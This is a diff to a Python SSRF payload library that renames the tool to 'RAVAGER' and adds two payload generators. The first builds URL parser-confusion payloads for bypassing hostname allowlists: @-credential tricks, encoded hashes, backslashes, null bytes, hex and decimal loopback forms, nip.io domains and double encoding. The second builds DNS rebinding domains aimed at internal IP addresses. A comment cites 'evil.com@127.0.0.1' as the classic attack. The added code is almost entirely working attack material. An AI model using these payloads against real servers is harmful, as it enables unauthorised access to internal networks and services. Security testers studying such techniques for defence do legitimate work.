@@ -1,5 +1,5 @@
 """
-HELLHOUND SSRF v5.0 - Payload Mutation Library
+RAVAGER SSRF v2.0 - Payload Mutation Library
 =================================================
 v5 additions:
   [v5-NEW] CRLF injection payloads (newline_injection already existed,
@@ -153,7 +153,7 @@ def build_scheme_confusion_payloads(host: str, port: int = 80) -> list[str]:
 # [v5-NEW] CRLF injection payload builder
 # ---------------------------------------------------------------------------
 
-def build_crlf_payloads(inject_header: str = "X-Injected", inject_value: str = "hellhound-ssrf-v5") -> list[str]:
+def build_crlf_payloads(inject_header: str = "X-Injected", inject_value: str = "ravager-ssrf-v2") -> list[str]:
     """
     Returns CRLF injection variants for testing header injection sinks.
     These are used by context_classifier CRLF_INJECTION candidates.
@@ -346,3 +346,167 @@ def build_ssrf_payload(
         if mutation in ENCODING_MUTATIONS:
             return ENCODING_MUTATIONS[mutation](url)
     return url
+
+
+# ---------------------------------------------------------------------------
+# [v2-NEW] URL parser confusion payloads
+# ---------------------------------------------------------------------------
+# These exploit discrepancies between URL parsing libraries. A server-side
+# validator may parse the URL with one library (accepting it as "external"),
+# while the actual HTTP client resolves it differently (reaching internal).
+#
+# Classic attack: http://evil.com@127.0.0.1/
+#   - urllib.parse:  host=evil.com, userinfo empty → passes allowlist
+#   - Go net/url:    host=127.0.0.1, userinfo=evil.com → hits internal
+#   - cURL:          host=127.0.0.1, userinfo=evil.com → hits internal
+#
+# Each function returns a list of payloads targeting a specific internal IP.
+# ---------------------------------------------------------------------------
+
+def build_parser_confusion_payloads(
+    target_ip: str = "127.0.0.1",
+    decoy_host: str = "example.com",
+    path: str = "/",
+) -> list[dict]:
+    """
+    Generates URL parser confusion payloads that exploit differences
+    between URL parsing libraries to bypass hostname allowlists.
+
+    Returns: list of dicts with 'payload', 'technique', 'category' keys.
+    """
+    payloads: list[dict] = []
+
+    # --- @-credential confusion ---
+    # Validator sees host=decoy_host; HTTP client sees host=target_ip
+    payloads.append({
+        "payload": f"http://{decoy_host}@{target_ip}{path}",
+        "technique": "at_credential_confusion",
+        "category": "parser_confusion",
+    })
+    payloads.append({
+        "payload": f"http://{decoy_host}:80@{target_ip}{path}",
+        "technique": "at_credential_with_port",
+        "category": "parser_confusion",
+    })
+
+    # --- Fragment abuse ---
+    # Some parsers treat # as fragment start, others pass it through
+    payloads.append({
+        "payload": f"http://{target_ip}%23@{decoy_host}{path}",
+        "technique": "fragment_encoded_hash",
+        "category": "parser_confusion",
+    })
+    payloads.append({
+        "payload": f"http://{target_ip}#@{decoy_host}{path}",
+        "technique": "fragment_raw_hash",
+        "category": "parser_confusion",
+    })
+
+    # --- Backslash normalization ---
+    # Windows-origin parsers normalize \ to /; Unix parsers don't
+    payloads.append({
+        "payload": f"http://{decoy_host}\\@{target_ip}{path}",
+        "technique": "backslash_normalization",
+        "category": "parser_confusion",
+    })
+
+    # --- Null byte truncation ---
+    # Some parsers truncate at %00; others pass it through
+    payloads.append({
+        "payload": f"http://{target_ip}%00@{decoy_host}{path}",
+        "technique": "null_byte_truncation",
+        "category": "parser_confusion",
+    })
+
+    # --- Port + hash confusion ---
+    payloads.append({
+        "payload": f"http://{target_ip}:80%23@{decoy_host}{path}",
+        "technique": "port_hash_confusion",
+        "category": "parser_confusion",
+    })
+
+    # --- Short-form IP addresses ---
+    # These are valid IPs that many allowlists don't recognize
+    payloads.extend([
+        {"payload": f"http://127.1{path}", "technique": "short_form_127_1", "category": "parser_confusion"},
+        {"payload": f"http://0{path}", "technique": "short_form_zero", "category": "parser_confusion"},
+        {"payload": f"http://0.0.0.0{path}", "technique": "quad_zero", "category": "parser_confusion"},
+        {"payload": f"http://[::]{path}", "technique": "ipv6_any", "category": "parser_confusion"},
+        {"payload": f"http://0x7f000001{path}", "technique": "hex_loopback", "category": "parser_confusion"},
+        {"payload": f"http://2130706433{path}", "technique": "decimal_loopback", "category": "parser_confusion"},
+    ])
+
+    # --- Domain-based bypasses ---
+    payloads.extend([
+        {"payload": f"http://localtest.me{path}", "technique": "localtest_me_domain", "category": "dns_bypass"},
+        {"payload": f"http://127.0.0.1.nip.io{path}", "technique": "nip_io_resolve", "category": "dns_bypass"},
+        {"payload": f"http://spoofed.burpcollaborator.net{path}", "technique": "collaborator_domain", "category": "dns_bypass"},
+        {"payload": f"http://customer1.app.localhost{path}", "technique": "app_localhost", "category": "dns_bypass"},
+    ])
+
+    # --- Double encoding ---
+    payloads.append({
+        "payload": f"http://%2531%2532%2537%252e%2530%252e%2530%252e%2531{path}",
+        "technique": "double_url_encoding",
+        "category": "parser_confusion",
+    })
+
+    # --- Tab/newline injection in URL ---
+    # Some parsers strip \t and \n from URLs before parsing
+    payloads.append({
+        "payload": f"http://127.0.0%091{path}",
+        "technique": "tab_in_ip",
+        "category": "parser_confusion",
+    })
+    payloads.append({
+        "payload": f"http://127.0.0%0a1{path}",
+        "technique": "newline_in_ip",
+        "category": "parser_confusion",
+    })
+
+    return payloads
+
+
+def build_dns_rebinding_payloads(
+    external_ip: str,
+    internal_targets: list[str],
+    base_domain: str = "cf.local",
+) -> list[dict]:
+    """
+    Generates DNS rebinding payload URLs using the RAVAGER rebinding
+    server's domain format.
+
+    Each domain alternates DNS responses:
+      1st resolution → external_ip (passes allowlist)
+      2nd resolution → internal target (bypasses check, hits internal)
+
+    Requires --dns-rebind flag to start the rebinding DNS server.
+    """
+    import ipaddress as _ipa
+
+    payloads: list[dict] = []
+    try:
+        ext_hex = format(int(_ipa.IPv4Address(external_ip)), "08x")
+    except ValueError:
+        return payloads
+
+    for target in internal_targets:
+        try:
+            int_hex = format(int(_ipa.IPv4Address(target)), "08x")
+        except ValueError:
+            continue
+
+        domain = f"rebind-{ext_hex}-{int_hex}.{base_domain}"
+        payloads.append({
+            "payload": f"http://{domain}/",
+            "technique": "dns_rebinding_toctou",
+            "category": "dns_rebinding",
+            "meta": {
+                "external_ip": external_ip,
+                "internal_target": target,
+                "domain": domain,
+            },
+        })
+
+    return payloads
+
